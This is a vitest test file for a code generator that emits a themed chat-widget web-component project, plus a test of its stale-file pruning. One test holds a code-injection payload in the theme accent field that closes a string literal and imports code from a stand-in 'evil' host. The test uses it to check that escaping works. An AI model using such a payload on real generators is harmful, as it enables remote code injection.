import { mkdtempSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { generateProject, writeProject } from './codegen';
import { validateConstruct, type Construct } from './schema';

function construct(overrides: Partial<Construct> = {}): Construct {
  const out = validateConstruct({
    name: 'acme-support',
    layout: 'widget',
    provider: { mode: 'mock' },
    ...overrides,
  });
  if (!out.ok) throw new Error(JSON.stringify(out.problems));
  return out.construct;
}

const file = (files: { path: string; code: string }[], path: string) => {
  const f = files.find((f) => f.path === path);
  if (!f) throw new Error(`missing ${path}; got ${files.map((x) => x.path).join(', ')}`);
  return f.code;
};

describe('generateProject (widget + mock core)', () => {
  it('emits the full project file set', () => {
    const paths = generateProject(construct()).map((f) => f.path).sort();
    expect(paths).toEqual(
      [
        'index.html',
        'package.json',
        'src/App.tsx',
        'src/element.tsx',
        'tsconfig.json',
        'vite.config.lib.ts',
        'vite.config.ts',
      ].sort(),
    );
  });

  it('is deterministic: same construct, same bytes', () => {
    expect(generateProject(construct())).toEqual(generateProject(construct()));
  });

  it('facade registers the construct name via @kitn.ai/ui/define', () => {
    const code = file(generateProject(construct()), 'src/element.tsx');
    expect(code).toContain("import { defineWebComponent } from '@kitn.ai/ui/define'");
    expect(code).toContain("defineWebComponent('acme-support'");
  });

  it('mock glue imports state + wire — never a hand-rolled SSE reader', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain("from '@kitn.ai/ui/state'");
    expect(app).toContain("from '@kitn.ai/ui/wire'");
    expect(app).not.toMatch(/text\/event-stream|EventSource|split\('\\n\\n'\)/);
  });

  it('theme accent lands on the HOST element as --kai-color-primary; mode maps onto the theme prop', () => {
    // Must be set on the host (via ctx.element in element.tsx), not anywhere
    // inside the shadow tree (App.tsx): the kit's --color-primary token is
    // resolved by a rule scoped to `:root, :host`, so --kai-color-primary set
    // on a descendant inside the shadow root never reaches it — custom
    // property inheritance only flows downward from where a property is
    // actually declared, and :host's own --color-primary is fixed at :host.
    const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'dark' } }));
    const element = file(files, 'src/element.tsx');
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-primary', \"#e91e63\")");
    expect(element).toContain("theme: 'dark' as 'light' | 'dark' | 'auto'");
    // Not set anywhere inside App.tsx (the shadow-tree content) — that was
    // the bug: it looked wired but never reached the launcher or the bubble.
    expect(file(files, 'src/App.tsx')).not.toContain('--kai-color-primary');
  });

  it('a hostile accent cannot break out of the emitted string literal', () => {
    // The schema places no charset constraint on `accent` ("any CSS color"); a
    // value containing a single quote must not let attacker-controlled text
    // become live source in the emitted element.tsx (e.g. closing the literal
    // and injecting a new statement/import).
    const hostile = "red'}; import('http://evil/x.js'); const y='";
    const element = file(generateProject(construct({ theme: { accent: hostile, mode: 'system' } })), 'src/element.tsx');
    // The raw payload must never appear unescaped/unquoted in the source.
    expect(element).not.toContain(`setProperty('--kai-color-primary', '${hostile}')`);
    // It must appear only inside a properly JSON-escaped string literal — i.e.
    // the single quote in the payload is escaped, so it cannot terminate the
    // literal early.
    expect(element).toContain(`setProperty('--kai-color-primary', ${JSON.stringify(hostile)})`);
    // The raw text right after the call, unescaped, must never be followed by
    // an unescaped `'` — i.e. no bare `'red'` breakout.
    expect(element).not.toMatch(/setProperty\('--kai-color-primary', 'red'\)/);
  });

  it('uiSpec overrides the @kitn.ai/ui dependency; default is ^<kit version>', () => {
    const pkg = (spec?: string) =>
      JSON.parse(file(generateProject(construct(), spec ? { uiSpec: spec } : {}), 'package.json'));
    expect(pkg('file:../kitn-ui.tgz').dependencies['@kitn.ai/ui']).toBe('file:../kitn-ui.tgz');
    expect(pkg().dependencies['@kitn.ai/ui']).toMatch(/^\^\d+\.\d+\.\d+$/);
  });

  it('emits no unreferenced imports (the generated tsconfig sets noUnusedLocals)', () => {
    // A named import with no reference anywhere else in the file fails TS6133
    // under the emitted project's own tsconfig.json (noUnusedLocals: true).
    // Grepping for a bare, never-referenced `type { X }` import is a cheap
    // proxy for that without running tsc on the emitted string.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain("import type { MessagePart } from '@kitn.ai/ui/solid';");
  });

  it('emits no non-kit utility classes (interior styling rule)', () => {
    for (const f of generateProject(construct())) {
      expect(f.code).not.toMatch(/class(Name)?="(flex|grid|p-\d|m-\d|text-)/);
    }
  });

  it('composes the kit\'s own Thread — not a hand-rolled message list', () => {
    // T5 demo defect: a hand-rolled <For>/<Message>/<MessageContent> list had
    // no padding, no gap between messages, and both roles left-aligned. The
    // kit ships a complete, consumable thread-layer composable (Thread, from
    // src/components/thread.tsx, on @kitn.ai/ui/solid) that already owns
    // scroll, per-role alignment/gap/padding and markdown — use it instead of
    // reassembling it from primitives.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain("from '@kitn.ai/ui/solid'");
    expect(app).toMatch(/\bThread\b/);
    expect(app).toContain('<Thread messages={chat.messages()}');
    // The old hand-rolled shape must be gone, not just supplemented.
    expect(app).not.toMatch(/<For each=\{chat\.messages\(\)\}/);
    expect(app).not.toContain('<MessageContent');
  });

  it('index.html carries a demo host-page hint for the widget layout, outside the element', () => {
    // Owner feedback: a blank white page with one small launcher confused a
    // first-time viewer of the preview. The hint is a HOST-page nicety, not
    // part of the emitted widget — it must sit outside the custom element.
    const html = file(generateProject(construct()), 'index.html');
    expect(html).toMatch(/This blank page stands in for your site/);
    expect(html).toMatch(/bottom-right corner/);
    const hintIndex = html.indexOf('This blank page stands in for your site');
    const elementIndex = html.indexOf('<acme-support>');
    expect(hintIndex).toBeGreaterThan(-1);
    expect(elementIndex).toBeGreaterThan(-1);
    expect(hintIndex).toBeLessThan(elementIndex);
  });

  it('routes the theme accent onto the launcher, the user bubble, and the send button via kit tokens', () => {
    // Owner feedback: theming is a headline format feature, but the accent
    // (#e91e63 in the demo fixture) appeared nowhere visible. Fix: consume it
    // through the kit's OWN --color-primary token routing (dock.tsx's
    // launcher CSS and Button's `variant="default"` both already read
    // var(--color-primary)/-foreground) — never hardcode the hex anywhere.
    const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'system' } }));
    const element = file(files, 'src/element.tsx');
    const app = file(files, 'src/App.tsx');
    // Exactly one hardcoded hex in the whole project: the JSON.stringify'd
    // custom-property value in element.tsx. Everything downstream of it
    // (the launcher, the bubble, the send button) reads var(--color-primary)
    // — never the literal color.
    const hexOccurrences = (element + app).match(/#e91e63/g) ?? [];
    expect(hexOccurrences).toHaveLength(1);
    expect(element).toContain("ctx.element.style.setProperty('--kai-color-primary', \"#e91e63\")");
    // The send button uses the kit's own primary Button variant (bg-primary /
    // text-primary-foreground under the hood) rather than a hand-styled one.
    expect(app).toContain('<Button variant="default"');
    // The user bubble has no primary-color prop on Thread, so it's routed via
    // the documented `part="bubble content"` styling hook, scoped to the user
    // role only via Message's own `data-role` attribute.
    expect(app).toContain('[data-role="user"] [part="bubble content"]');
    expect(app).toContain('var(--color-primary)');
    expect(app).toContain('var(--color-primary-foreground)');
  });
});

describe('writeProject', () => {
  it('writes files and prunes stale ones tracked via .kai-manifest.json', () => {
    const dir = mkdtempSync(join(tmpdir(), 'kai-construct-'));
    const projectA = generateProject(construct());
    writeProject(projectA, dir);
    for (const f of projectA) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const projectB = projectA.filter((f) => f.path !== 'index.html');
    writeProject(projectB, dir);

    expect(existsSync(join(dir, 'index.html'))).toBe(false);
    for (const f of projectB) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const manifest = JSON.parse(readFileSync(join(dir, '.kai-manifest.json'), 'utf8')) as string[];
    expect(manifest).toEqual(projectB.map((f) => f.path).sort());
  });
});
